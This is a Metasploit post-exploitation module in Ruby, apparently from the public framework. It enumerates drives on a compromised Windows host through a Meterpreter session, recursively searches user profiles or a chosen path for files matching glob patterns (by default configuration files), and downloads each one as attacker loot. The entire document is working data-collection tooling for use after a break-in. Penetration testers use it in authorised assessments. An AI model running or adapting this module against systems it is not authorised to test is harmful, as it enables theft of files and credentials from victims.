##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/auxiliary/report'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Generic File Collection',
      'Description'   => %q{
        This module downloads files recursively based on the FILE_GLOBS option.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
        [
          '3vi1john <Jbabio[at]me.com>',
          'RageLtMan <rageltman[at]sempervictus>'
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ]
    ))

    register_options(
      [
        OptString.new('SEARCH_FROM', [ false, 'Search from a specific location. Ex. C:\\']),
        OptString.new('FILE_GLOBS',  [ true, 'The file pattern to search for in a filename', '*.config'])
      ], self.class)
  end


  def get_drives
    ##All Credit Goes to mubix for this railgun-FU
    a = client.railgun.kernel32.GetLogicalDrives()["return"]
    drives = []
    letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    (0..25).each do |i|
      test = letters[i,1]
      rem = a % (2**(i+1))

      if rem > 0
        drives << test
        a = a - rem
      end
    end

    return drives
  end


  def download_files(location, file_type)
    sysdriv = client.sys.config.getenv('SYSTEMDRIVE')
    sysnfo = client.sys.config.sysinfo['OS']
    profile_path_old = sysdriv + "\\Documents and Settings\\"
    profile_path_new = sysdriv + "\\Users\\"

    if location
      print_status("Searching #{location}")
      getfile = client.fs.file.search(location,file_type,recurse=true,timeout=-1)

    elsif sysnfo =~/(Windows XP|2003|.NET)/
      print_status("Searching #{profile_path_old} through windows user profile structure")
      getfile = client.fs.file.search(profile_path_old,file_type,recurse=true,timeout=-1)
      else
      # For systems such as: Windows 7|Windows Vista|2008
      print_status("Searching #{profile_path_new} through windows user profile structure")
      getfile = client.fs.file.search(profile_path_new,file_type,recurse=true,timeout=-1)
    end

    getfile.each do |file|
      filename = "#{file['path']}\\#{file['name']}"
      data = read_file(filename)
      print_status("Downloading #{file['path']}\\#{file['name']}")
      p = store_loot("host.files", 'application/octet-stream', session, data, file['name'], filename)
      print_good("#{file['name']} saved as: #{p}")
    end
  end


  def run
    # When the location is set, make sure we have a valid path format
    location = datastore['SEARCH_FROM']
    if location and location !~ /^([a-z])\:[\\|\/].*/i
      print_error("Invalid SEARCH_FROM option: #{location}")
      return
    end

    # When the location option is set, make sure we have a valid drive letter
    my_drive = $1
    drives = get_drives
    if location and not drives.include?(my_drive)
      print_error("#{my_drive} drive is not available, please try: #{drives.inspect}")
      return
    end

    datastore['FILE_GLOBS'].split(",").each do |glob|
      begin
        download_files(location, glob.strip)
      rescue ::Rex::Post::Meterpreter::RequestError => e
        if e.message =~ /The device is not ready/
          print_error("#{my_drive} drive is not ready")
          next
        elsif e.message =~ /The system cannot find the path specified/
          print_error("Path does not exist")
          next
        else
          raise e
        end
      end
    end

    print_status("Done!")
  end
end
